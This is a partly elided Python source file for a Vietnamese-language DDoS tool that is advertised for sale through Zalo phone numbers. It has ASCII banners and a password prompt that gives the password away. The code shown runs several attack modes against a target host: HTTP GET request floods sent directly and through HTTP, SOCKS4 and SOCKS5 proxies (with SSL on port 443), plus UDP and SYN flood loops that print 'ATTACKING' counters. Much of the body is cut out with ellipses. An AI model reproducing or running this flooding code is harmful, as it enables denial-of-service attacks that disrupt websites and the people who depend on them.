...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: Tool cặc lõ của HTB ~ 0978809934 v2.8")
    print('''
Mua Tool mạnh hơn thì ib zalo : 0981788386
  █████   █    ██  ▄▄▄       ███▄    █   ▄████     ██░ ██  █    ██▓██   ██▓
▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒   ▓██░ ██▒ ██  ▓██▒▒██  ██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░   ▒██▀▀██░▓██  ▒██░ ▒██ ██░
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓   ░▓█ ░██ ▓▓█  ░██░ ░ ▐██▓░
...
def start_url():
    ...
    if sys.platform.startswith("linux"):
        ...
        if (not os.path.isfile(path)):
            print("[!] Lên GOOGLE tải NodeJs đi anh iuuu [!]")
...
def start_mode():
    ...
    print("""
[+]=====[ vui lòng nhập pass để chạy tool ]=====[+]
[+]==============[ Pass là: (4) ]===============[+]
[+]====[ Mua tool liên hệ zalo: 0981788386 ]====[+]
""")
    choice_mode = input("[*] vui lòng chọn số 4 [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
...
def choice_method_attack():
    ...
    print("-----------------------------")
    print("|_--> 1: Request [ Tấn công thường ]")
    print("|_--> 2: Request [  Spam  ]")
    method_attack = input("[*] chọn Request [1/2]: ")
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+]HTB[+] ATTACKING............. " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[+]HTB[+] ATTACKING | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[+]HTB[+] ATTACKING | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+]HTB[+] ATTACKING | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[+]HTB[+] ATTACKING | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+]HTB[+] ATTACKING | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+]HTB[+] ATTACKING | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
...
def udpflood():
    ...
    while True:
        ...
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+]HTB[+] ATTACKING UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[+]HTB[+] ATTACKING SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
